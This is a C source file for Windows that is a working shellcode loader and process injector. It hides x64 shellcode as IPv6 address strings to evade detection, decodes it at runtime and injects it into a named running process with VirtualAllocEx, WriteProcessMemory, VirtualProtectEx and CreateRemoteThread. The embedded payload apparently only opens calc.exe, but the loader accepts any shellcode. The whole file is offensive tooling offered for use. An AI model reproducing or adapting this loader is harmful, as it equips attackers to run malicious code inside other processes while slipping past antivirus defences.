#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
#include<wctype.h>
#include <iphlpapi.h>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

const char* IPv6Shell[] = {
    "FC48:83E4:F0E8:C000:0000:4151:4150:5251",
    "5648:31D2:6548:8B52:6048:8B52:1848:8B52",
    "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
    "AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED",
    "5241:5148:8B52:208B:423C:4801:D08B:8088",
    "0000:0048:85C0:7467:4801:D050:8B48:1844",
    "8B40:2049:01D0:E356:48FF:C941:8B34:8848",
    "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1",
    "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
    "8B40:2449:01D0:6641:8B0C:4844:8B40:1C49",
    "01D0:418B:0488:4801:D041:5841:585E:595A",
    "4158:4159:415A:4883:EC20:4152:FFE0:5841",
    "595A:488B:12E9:57FF:FFFF:5D48:BA01:0000",
    "0000:0000:0048:8D8D:0101:0000:41BA:318B",
    "6F87:FFD5:BBF0:B5A2:5641:BAA6:95BD:9DFF",
    "D548:83C4:283C:067C:0A80:FBE0:7505:BB47",
    "1372:6F6A:0059:4189:DAFF:D563:616C:632E",
    "6578:6500:9090:9090:9090:9090:9090:9090"
};

#define ElementsNumber 18
#define SizeOfShellcode 288

BOOL DecodeIPv6Fuscation(const char* IPV6[], PVOID LpBaseAddress) {

    PCSTR Terminator = NULL;
    PVOID LpBaseAddress2 = NULL;
    NTSTATUS STATUS;
    int i = 0;

    for (int j = 0; j < ElementsNumber; j++) {

        LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);

        STATUS = RtlIpv6StringToAddressA(
            (PCSTR)IPV6[j],
            &Terminator,
            (in6_addr*)LpBaseAddress2
        );

        if (!NT_SUCCESS(STATUS)) {

            printf("[!] RtlIpv6StringToAddressA failed for %s result %x", IPV6[j], STATUS);
            return FALSE;

        }
        else {

            i = i + 16;

        }
    }

    return TRUE;
}


BOOL InjectShellcode(HANDLE hprocess) {
    unsigned char buffer[SizeOfShellcode];
    PVOID address = VirtualAllocEx(hprocess, NULL, SizeOfShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (address == NULL) {
        printf("Can't allocate memory ex process .....\n");
        return FALSE;
    }

    DecodeIPv6Fuscation(IPv6Shell,buffer);

    BOOL write = WriteProcessMemory(hprocess, address, buffer, SizeOfShellcode, NULL);
    if (write == NULL) {
        printf("Can't write shellcode....\n");
        return FALSE;
    }

    DWORD oldprotect = 0;
    BOOL changProtect = VirtualProtectEx(hprocess, address, SizeOfShellcode, PAGE_EXECUTE_READWRITE, &oldprotect);
    if (changProtect == FALSE) {
        printf("Can't change protect ... \n");
        return FALSE;
    }

    HANDLE create = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, NULL);

    if (create == NULL) {
        printf("Can't create process...\n");
        return FALSE;
    }

    CloseHandle(create);
    return TRUE;
}

HANDLE EnumProc(wchar_t* NameProc) {
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (snap == INVALID_HANDLE_VALUE) {
        printf("snapshot failed ...\n");
        return NULL;
    }

    if (Process32First(snap, &pe) == FALSE) {
        printf("not having first process ... \n");
        return NULL;
    }
    WCHAR LowerName[MAX_PATH * 2];
    do {
        DWORD szNamePath = lstrlenW(pe.szExeFile);
        for (int i = 0; i < szNamePath; i++) {
            WCHAR c = pe.szExeFile[i];

            LowerName[i] = towlower(c);

        }
        LowerName[szNamePath] = L'\0';

        if (wcscmp(NameProc, LowerName) == 0) {
            HANDLE exactProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE,pe.th32ProcessID);
            CloseHandle(snap);
            return exactProc;

        }

        


    } while (Process32Next(snap, &pe));

    CloseHandle(snap);
    return NULL;
}

int wmain(int argc,wchar_t* argv[])
{
    if (argc < 2) {
        printf("not enough parameter for this program ...\n");
        return -1;
    }

    HANDLE hprocess = EnumProc(argv[1]);
    if (hprocess == NULL) {
        printf("can't find this process ..... \n");
        return -1;
    }

    InjectShellcode(hprocess);
    CloseHandle(hprocess);
}


